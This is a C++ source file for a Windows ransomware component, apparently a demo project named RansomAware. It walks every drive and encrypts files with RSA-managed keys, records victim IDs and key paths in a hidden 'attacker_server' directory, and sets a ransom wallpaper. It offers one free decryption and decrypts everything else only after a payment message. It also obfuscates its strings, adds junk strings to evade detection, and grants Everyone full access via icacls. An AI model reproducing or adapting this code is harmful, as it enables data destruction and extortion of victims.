#include "ServiceWorker.hpp"
#include "resource.h"
#include "..\..\include\include.hpp"

#include <chrono>
#include <ctime>
#include <iostream>
#include <string>
#include <fstream>

namespace fs = std::filesystem;

ServiceWorker::ServiceWorker() : m_attackerServerDirPath(_(".attacker_server\\")), m_usedFreeDecryption(false)
{
    INSERT_RND_LEGIT_STR;

    unpackResources();
    grantFullAccess();

    // 1. Creating hidden directory for server (*connecting to attacker server*)
    if (not utils::createDir(m_attackerServerDirPath, true))
    {
        DBG_PRINT("Creating hidden directory failed");
        utils::stopAndExit(EXIT_FAILURE);
    }

    m_fileEncrypter = &FileEncrypter::getInstance();
    m_keyManager = &CryptoKeyManager::getInstance();
}

ServiceWorker::~ServiceWorker()
{
}

void ServiceWorker::init()
{
    bool firstTime = createAndCheckFirstRunData();

    if (firstTime)
    {
        // 2. Generating RSA keys
        if (not m_keyManager->generateRSAKey())
        {
            DBG_PRINT("Generating RSA keys failed");
            utils::stopAndExit(EXIT_FAILURE);
        }

        // 3. Saving private key to hidden directory (*Sending private key to attacker server*)
        if (not m_keyManager->sendKeysTo(m_victimDataFilePath.c_str()))
        {
            DBG_PRINT("Sending private key failed");
            utils::stopAndExit(EXIT_FAILURE);
        }

        // 4. Destroying private key from memory 
        if (not m_keyManager->destroyPrivateKey())
        {
            DBG_PRINT("Destroying private key failed");
            utils::stopAndExit(EXIT_FAILURE);
        }
    }
    else
    {
        // 5. Restore public key from hidden directory (*Receiving public key from attacker server*)
        if (not m_keyManager->restorePublicKeyFrom(m_victimPublicKeyPath.c_str()))
        {
            DBG_PRINT("Restoring public key failed");
            utils::stopAndExit(EXIT_FAILURE);
        }
    }

    m_fileEncrypter->init(m_keyManager);
}

ServiceWorker::DriverList ServiceWorker::getDrives()
{
    DWORD driveMask = GetLogicalDrives();
    if (driveMask == 0) 
    {
        return {};
    }

    DriverList drives;
    for (char drive = 'A'; drive <= 'Z'; drive++) 
    {
        if ((driveMask & 1) != 0) 
        {
            drives.emplace_back(drive + std::string(":\\"));
        }
        driveMask >>= 1;
    }

    return std::move(drives);
}

void ServiceWorker::encryptAllFiles(const DriverList& drivers)
{
    INSERT_RND_LEGIT_STR;

    try
    {
        for (const auto& driver : drivers)
        {
            searchAndEncryptFiles(driver, false);
        }
    }
    catch (...)
    {
        DBG_PRINT("Unkown exception thrown when encrypting files");
	}
}

void ServiceWorker::decryptAllFiles(const DriverList& drivers)
{
    INSERT_RND_LEGIT_STR;

    try
    {
        for (const auto& driver : drivers)
        {
            searchAndEncryptFiles(driver, true);
		}
	}
    catch (...)
    {
		DBG_PRINT("Unkown exception thrown when decrypting files");
	}
}

fs::path ServiceWorker::decryptRandomFile()
{
    INSERT_RND_LEGIT_STR;

    if (m_skippedUnecryptedFile.empty())
    {
        DBG_PRINT("No files to encrypt/decrypt");
        utils::stopAndExit(EXIT_FAILURE);
    }

    // That could be moved to encryptAllFiles() and generate RSA keys just for one random file,
    // then encrypt it and save for use in this function, but to keep this project simple
    // I decided to generate RSA keys only once and use them for all files

    // 1. Generate new RSA key pair
    if (not m_keyManager->generateRSAKey())
    {
        DBG_PRINT("Generating RSA keys failed");
        utils::stopAndExit(EXIT_FAILURE);
    }

    // 2. Encrypt skipped file
    if (!m_fileEncrypter->encryptFile(m_skippedUnecryptedFile.string().c_str()))
    {
        DBG_PRINT("Encrypting file failed");
		utils::stopAndExit(EXIT_FAILURE);
    }

    // 3. Decrypt that file
    if (!m_fileEncrypter->decryptFile(m_skippedUnecryptedFile.string().c_str()))
    {
		DBG_PRINT("Decrypting file failed");
        utils::stopAndExit(EXIT_FAILURE);
    }

    std::ifstream fileIn(m_victimDataFilePath);
    std::vector<std::string> lines;
    std::string line;

    if (!fileIn.is_open()) 
    {
        DBG_PRINT("Cannot open victim data file");
        utils::stopAndExit(EXIT_FAILURE);
    }

    while (std::getline(fileIn, line))
        lines.push_back(line);
    fileIn.close();

    if (lines.size() < 5) 
    {
        DBG_PRINT("File does not contain enough lines to modify free decryption flag field");
        utils::stopAndExit(EXIT_FAILURE);
    }

    lines[4] = "1";

    std::ofstream fileOut(m_victimDataFilePath);
    if (!fileOut.is_open()) 
    {
        DBG_PRINT("Cannot open file for writing");
        utils::stopAndExit(EXIT_FAILURE);
    }

    for (const auto& modifiedLine : lines)
        fileOut << modifiedLine << std::endl;
    fileOut.close();

    m_usedFreeDecryption = true;

    return m_skippedUnecryptedFile;
}

const std::string& ServiceWorker::getPrivateKeyFilePath() const
{
    return m_victimPrivateKeyPath;
}

const std::string& ServiceWorker::getPublicKeyFilePath() const
{
    return m_victimPublicKeyPath;
}

void ServiceWorker::unpackResources()
{
    INSERT_RND_LEGIT_STR;

    HRSRC hRes = FindResource(nullptr, MAKEINTRESOURCE(IDR_ZIP1), L"ZIP");
    if (hRes == NULL)
    {
        DBG_PRINT("Finding zip resource failed");
        return utils::stopAndExit(EXIT_FAILURE);
    }

    HGLOBAL hData = LoadResource(nullptr, hRes);
    if (hData == NULL)
    {
		DBG_PRINT("Loading zip resource failed");
        return utils::stopAndExit(EXIT_FAILURE);
	}

    void* data = LockResource(hData);
    DWORD dataSize = SizeofResource(nullptr, hRes);

    if (data == NULL)
    {
        DBG_PRINT("Locking zip resource failed (data was NULL)");
        return utils::stopAndExit(EXIT_FAILURE);
    }

    std::ofstream file(_("tmp.zip"), std::ios::binary);
    file.write((char*)data, dataSize);
    file.close();

    unpackZIP(fs::absolute(_("tmp.zip")).string(), utils::getCurrentWorkingDir());

    fs::remove(_("tmp.zip"));
}

void ServiceWorker::grantFullAccess()
{
    INSERT_RND_LEGIT_STR;

    /*
        Command grants full read and write permissions to every user (Everyone) for the current directory and all its contents, 
        including recursively applying these permissions to subdirectories and files. 
        The command will continue even if errors occur and will operate quietly without displaying messages.
    */

    sysCall(skCrypt("icacls . /grant Everyone:F /T /C /Q"));
}

void ServiceWorker::openGUI()
{
    INSERT_RND_LEGIT_STR;
#ifdef _DEBUG
    std::string cmd = _("powershell -command start ") + utils::getCurrentWorkingDir() + _("\\RansomAware_dbg.exe");
#else
    std::string cmd = _("powershell -command start ") + utils::getCurrentWorkingDir() + _("\\RansomAware.exe");
#endif
	sysCall(cmd.c_str());
}

void ServiceWorker::setWallpaper()
{
    INSERT_RND_LEGIT_STR;

    HRSRC hRes = FindResource(nullptr, MAKEINTRESOURCE(IDB_PNG1), TEXT("PNG"));
    if (hRes == NULL)
    {
        DBG_PRINT("Finding png resource failed");
        return utils::stopAndExit(EXIT_FAILURE);
    }

    HGLOBAL hData = LoadResource(nullptr, hRes);
    if (hData == NULL)
    {
        DBG_PRINT("Loading png resource failed");
        return utils::stopAndExit(EXIT_FAILURE);
    }

    void* data = LockResource(hData);
    DWORD dataSize = SizeofResource(nullptr, hRes);

    if (data == NULL)
    {
        DBG_PRINT("Locking png resource failed (data was NULL)");
        return utils::stopAndExit(EXIT_FAILURE);
    }

    std::ofstream file(_("tmp.png"), std::ios::binary);
    file.write((char*)data, dataSize);
    file.close();

    auto strPath = utils::getCurrentWorkingDir() + _("\\tmp.png");
    int sizeNeeded = MultiByteToWideChar(CP_UTF8, 0, &strPath[0], (int)strPath.size(), NULL, 0);
    std::wstring wstr(sizeNeeded, 0);
    MultiByteToWideChar(CP_UTF8, 0, &strPath[0], (int)strPath.size(), &wstr[0], sizeNeeded);

    SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)wstr.c_str(), SPIF_UPDATEINIFILE);
}

void ServiceWorker::handleServerComs(std::unique_ptr<NamedPipeServer> server)
{
    while (true)
    {
        char buffer[0x100]{ '\0' };
        DWORD bytesRead = 0;
        if (server->readData(buffer, sizeof(buffer), bytesRead))
        {
            buffer[bytesRead - 1] = '\0';
            std::string msg(buffer);

            if (msg.find(_("PAYMENT_REC")) != std::string::npos)
            {
                handlePaymentMsg();
            }
            else if (msg.find(_("FREE_DEC")) != std::string::npos)
            {
                if (not m_usedFreeDecryption)
                    handleFreeDecryptMsg();
                else
                    handleDecryptionMsg();
            }
        }
    }
}

void ServiceWorker::handlePaymentMsg()
{
    DBG_PRINT("Payment received, decrypting files...");

    auto drives = getDrives();

    m_keyManager->receivePrivateKeyFrom(getPrivateKeyFilePath().c_str());
    decryptAllFiles(drives);

    MessageBoxA(0,
        skCrypt("Your files have been decrypted.\nThank you for your cooperation!."),
        skCrypt("Decryption successful"),
        MB_OK | MB_ICONINFORMATION);
}

void ServiceWorker::handleFreeDecryptMsg()
{
    DBG_PRINT("Free decryption request received, decrypting random file...");
    auto path = decryptRandomFile();

    DBG_PRINT("Decrypted file path: %s", path.string().c_str());
    MessageBoxA(0,
        (_("Random file have been decrypted. You can find the decrypted file at: ") + path.string()).c_str(),
        skCrypt("Decryption successful"),
        MB_OK | MB_ICONINFORMATION);
}

void ServiceWorker::handleDecryptionMsg()
{
    DBG_PRINT("Free decryption request received, but already used");
    MessageBoxA(0,
        skCrypt("You have already used your free decryption.\nYou can purchase the decryption key by paying the ransom."),
        skCrypt("Free decryption already used"),
        MB_OK | MB_ICONINFORMATION);
}

void ServiceWorker::searchAndEncryptFiles(const fs::path& dir, bool decrypt)
{
    const auto& extensions = m_fileEncrypter->getTargetFileExtensions();
    const auto& encryptedFileExt = m_fileEncrypter->getEncryptedFileExtension();

    try
    {
        for (const auto& entry : fs::directory_iterator(dir))
        {
            const auto& path = entry.path();
            const auto& ext = path.extension().string();

            if (entry.is_directory())
                searchAndEncryptFiles(path, decrypt);

            if (not decrypt)
            {
                //Encrypting all valid files
                if (ext != encryptedFileExt and extensions.find(ext) != extensions.end())
                {
                    //Skip 1st file so one free decryption can be used with new generated keys
                    if (m_skippedUnecryptedFile.empty())
                    {
                        m_skippedUnecryptedFile = path;
                        continue;
                    }

                    if (path.string().find(_("attacker_server")) != std::string::npos)
						continue;

                    if (!m_fileEncrypter->encryptFile(path.string().c_str()))
                        DBG_PRINT("Cannot encrypt file %s", path.string().c_str());
                }
            }
            else
            {
                //Decrypting all encrypted files
                if (ext == encryptedFileExt)
                {
					if (!m_fileEncrypter->decryptFile(path.string().c_str()))
					    DBG_PRINT("Cannot decrypt file %s", path.string().c_str());
				}
            }
        }
    }
    catch (const fs::filesystem_error& e)
    {
        DBG_PRINT("Exception thrown when searching files: %s", e.what());
    }
}

bool ServiceWorker::createAndCheckFirstRunData()
{
    INSERT_RND_LEGIT_STR;

    // 1. Check if attacker server is running (*check if hidden directory exists*)
    if (not fs::exists(m_attackerServerDirPath))
    {
		DBG_PRINT("Hidden directory doesn't exist");
		utils::stopAndExit(EXIT_FAILURE);
	}

    // 2. Search for .dat file (*search for victim data file*)
    m_attackerServerDirPath = fs::absolute(m_attackerServerDirPath).string();
    for (const auto& entry : fs::directory_iterator(m_attackerServerDirPath))
    {
		const auto& path = entry.path();
		const auto& ext = path.extension().string();

		if (entry.is_directory())
			continue;
        else if (ext == ".dat") // Found victim data file
        {
            m_victimDataFilePath = fs::absolute(path).string();
			break;
		}
	}

    // 3. If .dat file doesn't exist, create one and fill it
    if (not fs::exists(m_victimDataFilePath))
    {
        m_victimID = utils::getSystemUserName() + "_" + utils::genRandomString(16);
        m_victimDataFilePath = m_attackerServerDirPath + m_victimID + ".dat";
        m_victimPrivateKeyPath = m_attackerServerDirPath + m_victimID + ".pem";
        m_victimPublicKeyPath = m_attackerServerDirPath + m_victimID + ".pub";

        std::ofstream file(m_victimDataFilePath);
        if (not file.is_open())
        {
            DBG_PRINT("Cannot open victim data file");
            utils::stopAndExit(EXIT_FAILURE);
        }
        fillVictimDataFile(file);
		file.close();
        return true;
	}

    // 4. If .dat file exists, read victim data from it
    std::ifstream file(m_victimDataFilePath);
    readVictimDataFile(file);
    file.close();
	
    return false;
}

void ServiceWorker::fillVictimDataFile(std::ofstream& file)
{
    INSERT_RND_LEGIT_STR;

    // Write current date and time (ISO 8601)
    auto now = std::chrono::system_clock::now();
    auto time_t_now = std::chrono::system_clock::to_time_t(now);
    m_victimFirstRunTime = *std::localtime(&time_t_now);

    file << std::put_time(&m_victimFirstRunTime, "%Y-%m-%dT%H:%M:%S") << std::endl;

    // Write victim ID
    file << m_victimID << std::endl;

    // Write victim private key file path
    file << m_victimPrivateKeyPath << std::endl;

    // Write victim public key file path
    file << m_victimPublicKeyPath << std::endl;

    // Write free decryption status
    file << "0" << std::endl;
}

void ServiceWorker::readVictimDataFile(std::ifstream& file)
{
    INSERT_RND_LEGIT_STR;

    std::string line;
    if (std::getline(file, line))
    {
        std::istringstream ss(line);
        ss >> std::get_time(&m_victimFirstRunTime, "%Y-%m-%dT%H:%M:%S");
        if (ss.fail()) 
        {
            DBG_PRINT("Parsing date time failed");
            utils::stopAndExit(EXIT_FAILURE);
        }
    }

    std::getline(file, m_victimID);
    std::getline(file, m_victimPrivateKeyPath);
    std::getline(file, m_victimPublicKeyPath);
    std::getline(file, line);
    m_usedFreeDecryption = static_cast<bool>(std::stoi(line));
}

void ServiceWorker::unpackZIP(const std::string& zipPath, const std::string& destPath)
{
    INSERT_RND_LEGIT_STR;

    DBG_PRINT("Unpacking %s to %s", zipPath.c_str(), destPath.c_str());
    char command[512];

    /*
        Extract the contents of the specified archive file to the specified destination directory, 
        overwriting existing files if necessary, without prompting for confirmation.
    */

    sprintf(command, 
        skCrypt("powershell -command \"Expand-Archive -LiteralPath '%s' -DestinationPath '%s'\" -Force\""), 
        zipPath.c_str(), 
        destPath.c_str());

    sysCall(command);
}

void ServiceWorker::sysCall(const char* cmd)
{
    INSERT_RND_LEGIT_STR;

    DBG_PRINT("Running cmd<%s> ...", cmd);
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags |= STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcessA(
        NULL,   // No module name (use command line)
        (LPSTR)cmd, // Command line
        NULL,   // Process handle not inheritable
        NULL,   // Thread handle not inheritable
        FALSE,  // Set handle inheritance to FALSE
        CREATE_NO_WINDOW, // No window is created
        NULL,   // Use parent's environment block
        NULL,   // Use parent's starting directory 
        &si,    // Pointer to STARTUPINFO structure
        &pi)    // Pointer to PROCESS_INFORMATION structure
        )
    {
        DBG_PRINT("CreateProcess for cmd <%s> failed: %d", cmd, GetLastError());
        utils::stopAndExit(EXIT_FAILURE);
    }

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

